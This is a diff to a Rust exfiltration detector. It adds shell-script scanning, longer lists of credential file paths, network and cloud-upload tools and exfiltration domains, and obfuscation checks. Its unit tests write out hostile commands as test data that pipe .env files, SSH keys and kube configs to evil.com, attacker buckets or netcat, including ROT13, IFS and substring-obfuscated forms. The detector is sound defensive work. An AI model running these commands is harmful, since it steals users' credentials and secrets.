@@ -12,6 +12,10 @@ static XXD_REGEX: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bxxd\b").unwr
 /// Regex for detecting `od` as a command (word boundary).
 static OD_REGEX: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bod\b").unwrap());
 
+/// Regex for bash substring/parameter expansion: ${var:0:1}
+static BASH_SUBSTRING_REGEX: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\$\{[^}]+:\d+").unwrap());
+
 mod elixir;
 mod groovy;
 mod javascript;
@@ -67,6 +71,7 @@ static PARSER_LOCK: Mutex<()> = Mutex::new(());
 /// - Scala: `.scala`, `.sc`
 /// - Kotlin: `.kt`, `.kts`
 /// - Nix: `.nix`
+/// - Shell: `.sh`, `.bash`, `.zsh`, `.ksh`, `.fish`
 #[must_use]
 pub fn scan_file_content(filename: &str, content: &str) -> Option<String> {
     let ext = Path::new(filename)
@@ -119,15 +124,43 @@ pub fn scan_file_content(filename: &str, content: &str) -> Option<String> {
         // Nix
         "nix" => detect_exfil_in_code(content, &NixDetector, filename),
 
+        // Shell scripts - use detect_exfiltration directly
+        "sh" | "bash" | "zsh" | "ksh" | "fish" => detect_exfiltration(content),
+
         // Unsupported extension
         _ => None,
     }
 }
 
 const NETWORK_SINKS: &[&str] = &[
-    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "telnet", "ftp",
-    "nslookup", "dig", "host", "openssl", "socat", "http", "https", "xh", "curlie", "httpie",
-    "aria2c", "axel", "wge", "curlx",
+    "curl", "wget", "http", "https", "xh", "curlie", "httpie", "aria2c", "axel", "wge", "curlx",
+    "nc", "ncat", "netcat", "telnet", "socat", "openssl", "ssh", "scp", "sftp", "rsync", "ftp",
+    "lftp", "rcp", "nslookup", "dig", "host", "aws", "gcloud", "gsutil", "az", "s3cmd", "rclone",
+    "azcopy", "git",
+];
+
+// Cloud storage upload commands (always suspicious with sensitive data)
+const CLOUD_UPLOAD_COMMANDS: &[&str] = &[
+    "aws s3 cp",
+    "aws s3 mv",
+    "aws s3 sync",
+    "gsutil cp",
+    "gsutil rsync",
+    "az storage blob upload",
+    "az storage file upload",
+    "azcopy copy",
+    "rclone copy",
+    "rclone sync",
+    "s3cmd put",
+];
+
+// Clipboard tools (data can be exfiltrated via copy-paste)
+const CLIPBOARD_TOOLS: &[&str] = &[
+    "pbcopy",   // macOS
+    "xclip",    // Linux X11
+    "xsel",     // Linux X11
+    "wl-copy",  // Wayland
+    "clip.exe", // Windows/WSL
 ];
 
 // Flagged unconditionally (no sensitive source required)
@@ -141,29 +174,119 @@ const SENSITIVE_SOURCES: &[&str] = &[
 ];
 
 pub(crate) const SENSITIVE_PATHS: &[&str] = &[
+    // Environment and config
     ".env",
+    ".envrc",
+    ".bashrc",
+    ".zshrc",
+    ".profile",
+    ".bash_profile",
+    ".bash_history",
+    ".zsh_history",
+    // SSH
     ".ssh/",
+    "id_rsa",
+    "id_ed25519",
+    "id_dsa",
+    "id_ecdsa",
+    "known_hosts",
+    "authorized_keys",
+    // Cloud credentials
     ".aws/",
+    ".azure/",
+    ".config/gcloud/",
+    ".kube/config",
+    ".docker/config.json",
+    // GPG/PGP
     ".gnupg/",
+    ".pgp/",
+    // Package managers
+    ".npmrc",
+    ".yarnrc",
+    ".pypirc",
+    ".gem/credentials",
+    ".cargo/credentials",
+    ".nuget/",
+    // Git
+    ".git-credentials",
+    ".gitconfig",
+    // Network auth
+    ".netrc",
+    ".curlrc",
+    ".wgetrc",
+    // System files
     "/etc/passwd",
     "/etc/shadow",
-    ".netrc",
-    ".npmrc",
-    ".pypirc",
+    "/etc/sudoers",
+    "/etc/hosts",
+    // Generic sensitive names
     "credentials",
     "secrets",
     ".token",
-    "id_rsa",
-    "id_ed25519",
+    "secret_key",
+    "private_key",
+    "api_key",
+    "access_token",
+    "refresh_token",
+    // Database
+    ".pgpass",
+    ".my.cnf",
+    ".mongoshrc.js",
+    // CI/CD
+    ".travis.yml",
+    ".circleci/",
+    ".github/secrets",
+    // macOS
+    "keychain",
+    ".keychain/",
 ];
 
 pub(crate) const EXFIL_DOMAINS: &[&str] = &[
+    // Webhook/request catchers
     "webhook.site",
+    "requestbin.com",
+    "requestcatcher.com",
+    "hookbin.com",
+    "beeceptor.com",
+    "mockbin.org",
+    "postb.in",
+    "ptsv2.com",
+    "putsreq.com",
+    // Tunneling services
     "ngrok.io",
     "ngrok-free.app",
-    "requestbin.com",
-    "pipedream.com",
+    "ngrok.app",
+    "localtunnel.me",
+    "serveo.net",
+    "localhost.run",
+    "tunnelto.dev",
+    "loca.lt",
+    "telebit.cloud",
+    // Pentesting/security tools
     "burpcollaborator.net",
+    "oastify.com",
+    "interact.sh",
+    "canarytokens.com",
+    "dnslog.cn",
+    "ceye.io",
+    // Pastebin services
+    "pastebin.com",
+    "paste.ee",
+    "hastebin.com",
+    "dpaste.org",
+    "ghostbin.com",
+    "rentry.co",
+    // Pipelines/automation
+    "pipedream.com",
+    "pipedream.net",
+    "zapier.com",
+    "ifttt.com",
+    // File sharing (potential exfil)
+    "transfer.sh",
+    "file.io",
+    "0x0.st",
+    "temp.sh",
+    "termbin.com",
 ];
 
 const INTERPRETERS: &[&str] = &[
@@ -428,7 +551,69 @@ fn check_obfuscation_patterns(command: &str) -> Option<String> {
         }
     }
 
+    // 10. tr-based ROT13 obfuscation: echo xxx | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+    if lower.contains("| tr ")
+        && (lower.contains("a-za-z") || lower.contains("a-mn-z"))
+        && has_suspicious_context(command)
+    {
+        return Some("Potential ROT13 obfuscation via tr".into());
+    }
+
+    // 11. IFS manipulation for command splitting
+    if lower.contains("ifs=") && has_suspicious_context(command) {
+        return Some("IFS manipulation detected with suspicious context".into());
+    }
+
+    // 12. Bash substring/parameter expansion obfuscation: ${var:0:1}
+    if command.contains("${")
+        && command.contains(':')
+        && has_suspicious_context(command)
+        && BASH_SUBSTRING_REGEX.is_match(command)
+    {
+        return Some("Bash substring extraction with suspicious context".into());
+    }
+
+    // 13. Cloud storage uploads with sensitive data
+    for upload_cmd in CLOUD_UPLOAD_COMMANDS {
+        if lower.contains(upload_cmd) && has_sensitive_context_in_command(command) {
+            return Some(format!(
+                "Cloud storage upload '{upload_cmd}' with sensitive data"
+            ));
+        }
+    }
+
+    // 14. Clipboard exfiltration
+    for clip_tool in CLIPBOARD_TOOLS {
+        if command.contains(clip_tool) && has_sensitive_context_in_command(command) {
+            return Some(format!(
+                "Clipboard tool '{clip_tool}' with sensitive data (potential exfil staging)"
+            ));
+        }
+    }
+
     None
+}
+
+/// Check if command contains sensitive data being piped or used
+fn has_sensitive_context_in_command(command: &str) -> bool {
+    // Check if a sensitive source is piped to or used with the sink
+    let lower = command.to_lowercase();
+
+    // Check for sensitive paths
+    for path in SENSITIVE_PATHS {
+        if lower.contains(path) {
+            return true;
+        }
+    }
+
+    // Check for sensitive commands
+    for src in SENSITIVE_SOURCES {
+        if lower.contains(src) {
+            return true;
+        }
+    }
+
+    false
 }
 
 /// Check if command has suspicious context (sensitive files or network indicators).
@@ -2024,5 +2209,141 @@ Invoke-WebRequest -Uri "http://evil.com" -Body $data
 "#;
         let result = scan_file_content("script.ps1", code);
         assert!(result.is_some(), "PowerShell exfil should be detected");
+    }
+
+    // === Shell script tests ===
+
+    #[test]
+    fn scan_file_shell_exfil() {
+        let code = r#"#!/bin/bash
+cat .env | curl -d @- http://evil.com
+"#;
+        let result = scan_file_content("malicious.sh", code);
+        assert!(result.is_some(), "Shell exfil should be detected");
+    }
+
+    #[test]
+    fn scan_file_shell_clean() {
+        let code = r#"#!/bin/bash
+echo "Hello, world!"
+ls -la
+"#;
+        let result = scan_file_content("hello.sh", code);
+        assert!(result.is_none(), "Clean shell script should pass");
+    }
+
+    #[test]
+    fn scan_file_zsh_exfil() {
+        let code = r#"#!/usr/bin/env zsh
+curl -d @.env http://evil.com
+"#;
+        let result = scan_file_content("script.zsh", code);
+        assert!(result.is_some(), "Zsh exfil should be detected");
+    }
+
+    // === New obfuscation pattern tests ===
+
+    #[test]
+    fn tr_rot13_obfuscation() {
+        let result = detect_exfiltration(
+            r#"echo 'phey' | tr 'a-za-z' 'n-za-mn-za-m' | sh -c "$(cat) http://evil.com -d @.env""#,
+        );
+        assert!(result.is_some(), "tr ROT13 obfuscation should detect");
+    }
+
+    #[test]
+    fn ifs_manipulation() {
+        let result = detect_exfiltration(r#"IFS=/ c='c/u/r/l'; $c http://evil.com -d @.env"#);
+        assert!(result.is_some(), "IFS manipulation should detect");
+    }
+
+    #[test]
+    fn bash_substring_extraction() {
+        let result =
+            detect_exfiltration(r#"cmd="curl http://evil.com"; ${cmd:0:4} -d @.env ${cmd:5}"#);
+        assert!(result.is_some(), "Bash substring extraction should detect");
+    }
+
+    // === Cloud storage exfil tests ===
+
+    #[test]
+    fn aws_s3_cp_exfil() {
+        let result = detect_exfiltration(r#"aws s3 cp .env s3://attacker-bucket/"#);
+        assert!(result.is_some(), "aws s3 cp with .env should detect");
+    }
+
+    #[test]
+    fn gsutil_exfil() {
+        let result = detect_exfiltration(r#"gsutil cp ~/.ssh/id_rsa gs://attacker-bucket/"#);
+        assert!(result.is_some(), "gsutil cp with ssh key should detect");
+    }
+
+    #[test]
+    fn rclone_exfil() {
+        let result = detect_exfiltration(r#"rclone copy ~/.aws/credentials remote:backup/"#);
+        assert!(
+            result.is_some(),
+            "rclone with aws credentials should detect"
+        );
+    }
+
+    // === Clipboard exfil tests ===
+
+    #[test]
+    fn pbcopy_exfil() {
+        let result = detect_exfiltration(r#"cat .env | pbcopy"#);
+        assert!(result.is_some(), "pbcopy with .env should detect");
+    }
+
+    #[test]
+    fn xclip_exfil() {
+        let result = detect_exfiltration(r#"cat ~/.ssh/id_rsa | xclip -selection clipboard"#);
+        assert!(result.is_some(), "xclip with ssh key should detect");
+    }
+
+    // === New sensitive path tests ===
+
+    #[test]
+    fn docker_config_exfil() {
+        let result = detect_exfiltration(r#"curl -d @~/.docker/config.json http://evil.com"#);
+        assert!(result.is_some(), "docker config.json should be sensitive");
+    }
+
+    #[test]
+    fn kube_config_exfil() {
+        let result = detect_exfiltration(r#"cat ~/.kube/config | nc evil.com 4444"#);
+        assert!(result.is_some(), "kube config should be sensitive");
+    }
+
+    #[test]
+    fn git_credentials_exfil() {
+        let result = detect_exfiltration(r#"curl -d @~/.git-credentials http://evil.com"#);
+        assert!(result.is_some(), ".git-credentials should be sensitive");
+    }
+
+    #[test]
+    fn bash_history_exfil() {
+        let result = detect_exfiltration(r#"cat ~/.bash_history | curl -d @- http://evil.com"#);
+        assert!(result.is_some(), ".bash_history should be sensitive");
+    }
+
+    // === New exfil domain tests ===
+
+    #[test]
+    fn pastebin_exfil() {
+        let result = detect_exfiltration(r#"curl -d "data" https://pastebin.com/api/api_post.php"#);
+        assert!(result.is_some(), "pastebin.com should be flagged");
+    }
+
+    #[test]
+    fn transfer_sh_exfil() {
+        let result = detect_exfiltration(r#"curl --upload-file .env https://transfer.sh/file"#);
+        assert!(result.is_some(), "transfer.sh should be flagged");
+    }
+
+    #[test]
+    fn interact_sh_exfil() {
+        let result = detect_exfiltration(r#"curl https://abc123.interact.sh"#);
+        assert!(result.is_some(), "interact.sh should be flagged");
     }
 }
